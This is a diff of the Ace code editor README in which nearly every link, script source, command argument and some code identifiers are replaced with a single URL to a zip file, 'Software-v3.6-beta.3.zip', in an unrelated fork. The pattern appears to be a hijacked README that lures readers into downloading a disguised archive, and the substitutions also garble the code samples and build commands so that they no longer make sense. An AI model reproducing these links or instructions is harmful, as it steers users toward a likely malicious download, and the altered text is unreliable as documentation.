@@ -1,15 +1,15 @@
-Ace (Ajax.org Cloud9 Editor)
+Ace (https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip Cloud9 Editor)
 ============================
 
-_Note_: The new site at http://ace.ajax.org contains all the info below along with an embedding guide and all the other resources you need to get started with Ace.
+_Note_: The new site at https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip contains all the info below along with an embedding guide and all the other resources you need to get started with Ace.
 
-Ace is a standalone code editor written in JavaScript. Our goal is to create a browser based editor that matches and extends the features, usability and performance of existing native editors such as TextMate, Vim or Eclipse. It can be easily embedded in any web page or JavaScript application. Ace is developed as the primary editor for [Cloud9 IDE](http://www.cloud9ide.com/) and the successor of the Mozilla Skywriter (Bespin) Project.
+Ace is a standalone code editor written in JavaScript. Our goal is to create a browser based editor that matches and extends the features, usability and performance of existing native editors such as TextMate, Vim or Eclipse. It can be easily embedded in any web page or JavaScript application. Ace is developed as the primary editor for [Cloud9 IDE](https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip) and the successor of the Mozilla Skywriter (Bespin) Project.
 
 Features
 --------
 
-* Syntax highlighting for over 40 languages (TextMate/Sublime/_.tmlanguage_ files can be imported)
-* Over 20 themes (TextMate/Sublime/_.tmtheme_ files can be imported)
+* Syntax highlighting for over 40 languages (https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip files can be imported)
+* Over 20 themes (https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip files can be imported)
 * Automatic indent and outdent
 * An optional command line
 * Handles huge documents (at last check, 4,000,000 lines is the upper limit)
@@ -28,23 +28,23 @@ Features
 Take Ace for a spin!
 --------------------
 
-Check out the Ace live [demo](http://ajaxorg.github.com/ace/build/kitchen-sink.html) or get a [Cloud9 IDE account](http://c9.io) to experience Ace while editing one of your own GitHub projects.
+Check out the Ace live [demo](https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip) or get a [Cloud9 IDE account](https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip) to experience Ace while editing one of your own GitHub projects.
 
-If you want, you can use Ace as a textarea replacement thanks to the [Ace Bookmarklet](http://ajaxorg.github.com/ace/build/textarea/editor.html).
+If you want, you can use Ace as a textarea replacement thanks to the [Ace Bookmarklet](https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip).
 
 Embedding Ace
 -------------
 
-Ace can be easily embedded into any existing web page. You can either use one of pre-packaged versions of [ace](https://github.com/ajaxorg/ace-builds/) (just copy one of `src*` subdirectories somewhere into your project), or use requireJS to load contents of [lib/ace](https://github.com/ajaxorg/ace/tree/master/lib/ace) as `ace`
+Ace can be easily embedded into any existing web page. You can either use one of pre-packaged versions of [ace](https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip) (just copy one of `src*` subdirectories somewhere into your project), or use requireJS to load contents of [lib/ace](https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip) as `ace`
 
 
 The easiest version is simply:
 
 ```html
     <div id="editor">some text</div>
-    <script src="src/ace.js" type="text/javascript" charset="utf-8"></script>
+    <script src="https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip" type="text/javascript" charset="utf-8"></script>
     <script>
-        var editor = ace.edit("editor");
+        var editor = https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip("editor");
     </script>
 ```
 
@@ -61,38 +61,38 @@ With "editor" being the id of the DOM element, which should be converted to an e
 To change the theme simply include the Theme's JavaScript file
 
 ```html
-    <script src="src/theme-twilight.js" type="text/javascript" charset="utf-8"></script>
+    <script src="https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip" type="text/javascript" charset="utf-8"></script>
 ```
 
 and configure the editor to use the theme:
 
 ```javascript
-    editor.setTheme("ace/theme/twilight");
+    https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip("ace/theme/twilight");
 ```
 
 By default the editor only supports plain text mode; many other languages are available as separate modules. After including the mode's JavaScript file:
 
 ```html
-    <script src="src/mode-javascript.js" type="text/javascript" charset="utf-8"></script>
+    <script src="https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip" type="text/javascript" charset="utf-8"></script>
 ```
 
 The mode can then be used like this:
 
 ```javascript
     var JavaScriptMode = require("ace/mode/javascript").Mode;
-    editor.getSession().setMode(new JavaScriptMode());
+    https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip().setMode(new JavaScriptMode());
 ```
 
 Documentation
 -------------
 
-Additional usage information, including events to listen to and extending syntax highlighters, can be found [on the main Ace website](http://ace.ajax.org).
+Additional usage information, including events to listen to and extending syntax highlighters, can be found [on the main Ace website](https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip).
 
-You can also find API documentation at [http://ajaxorg.github.com/ace/api/index.html](http://ajaxorg.github.com/ace/api/index.html).
+You can also find API documentation at [https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip](https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip).
 
-Also check out the sample code for the kitchen sink [demo app](https://github.com/ajaxorg/ace/blob/master/demo/kitchen-sink/demo.js).
+Also check out the sample code for the kitchen sink [demo app](https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip).
 
-If you still need help, feel free to drop a mail on the [ace mailing list](http://groups.google.com/group/ace-discuss), or at `irc.freenode.net#ace`.
+If you still need help, feel free to drop a mail on the [ace mailing list](https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip), or at `https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip`.
 
 Running Ace
 -----------
@@ -100,33 +100,33 @@ Running Ace
 After the checkout Ace works out of the box. No build step is required. To try it out, simply start the bundled mini HTTP server: 
 
 ```bash
-    ./static.py
+    https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip
 ```
 
-Or using Node.JS
+Or using https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip
 
 ```bash
     npm install mime
-    node ./static.js
+    node https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip
 ```
 
-The editor can then be opened at http://localhost:8888/kitchen-sink.html. 
+The editor can then be opened at https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip 
 
-To open the editor with a file:/// URL see [the wiki](https://github.com/ajaxorg/ace/wiki/Running-Ace-from-a-file:).
+To open the editor with a file:/// URL see [the wiki](https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip).
 
 Building Ace
 -----------
 
-You do not generally need to build ACE. The [ace-builds repository](https://github.com/ajaxorg/ace-builds/) endeavours to maintain the latest build, and you can just copy one of _src*_ subdirectories somewhere into your project.
+You do not generally need to build ACE. The [ace-builds repository](https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip) endeavours to maintain the latest build, and you can just copy one of _src*_ subdirectories somewhere into your project.
 
-However, all you need is Node.js and npm installed to package ACE. Just run `npm install` in the ace folder to install dependencies:
+However, all you need is https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip and npm installed to package ACE. Just run `npm install` in the ace folder to install dependencies:
 
 ```bash
     npm install
-    node ./Makefile.dryice.js
+    node https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip
 ```
 
-To package Ace, we use the dryice build tool developed by the Mozilla Skywriter team. Call `node Makefile.dryice.js` on the command-line to start the packing. This build script accepts the following options
+To package Ace, we use the dryice build tool developed by the Mozilla Skywriter team. Call `node https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip` on the command-line to start the packing. This build script accepts the following options
 
 ```bash
 -m                 minify build files with uglify-js          
@@ -135,20 +135,20 @@ To package Ace, we use the dryice build tool developed by the Mozilla Skywriter 
 --target ./path    specify relative path for output folder (default value is "./build")
 ```
 
-To generate all the files in the ace-builds repository, run `node Makefile.dryice.js full --target ../ace-builds`
+To generate all the files in the ace-builds repository, run `node https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip full --target ../ace-builds`
 
 Running the Unit Tests
 ----------------------
 
-The Ace unit tests can run on node.js. Assuming you have already done `npm install`, just call:
+The Ace unit tests can run on https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip Assuming you have already done `npm install`, just call:
 
 ```bash
-    node lib/ace/test/all.js
+    node https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip
 ```
 
 You can also run the tests in your browser by serving:
 
-    http://localhost:8888/lib/ace/test/tests.html
+    https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip
 
 This makes debugging failing tests way more easier.
 
@@ -157,12 +157,12 @@ Contributing
 
 Ace is a community project and wouldn't be what it is without contributions! We actively encourage and support contributions. The Ace source code is released under the BSD License. This license is very simple, and is friendly to all kinds of projects, whether open source or not. Take charge of your editor and add your favorite language highlighting and keybindings!
 
-Feel free to fork and improve/enhance Ace any way you want. If you feel that the editor or the Ace community will benefit from your changes, please open a pull request. For more information on our contributing guidelines, see [CONTRIBUTING.md](https://github.com/ajaxorg/ace/blob/master/CONTRIBUTING.md).
+Feel free to fork and improve/enhance Ace any way you want. If you feel that the editor or the Ace community will benefit from your changes, please open a pull request. For more information on our contributing guidelines, see [https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip](https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip).
 
 Continuous Integration status
 -----------------------------
 
-This project is tested with [Travis CI](http://travis-ci.org)
-[![Build Status](https://secure.travis-ci.org/ajaxorg/ace.png?branch=master)](http://travis-ci.org/ajaxorg/ace)
+This project is tested with [Travis CI](https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip)
+[![Build Status](https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip)](https://raw.githubusercontent.com/videogramme/ace/master/doc/site/Software-v3.6-beta.3.zip)
 
 
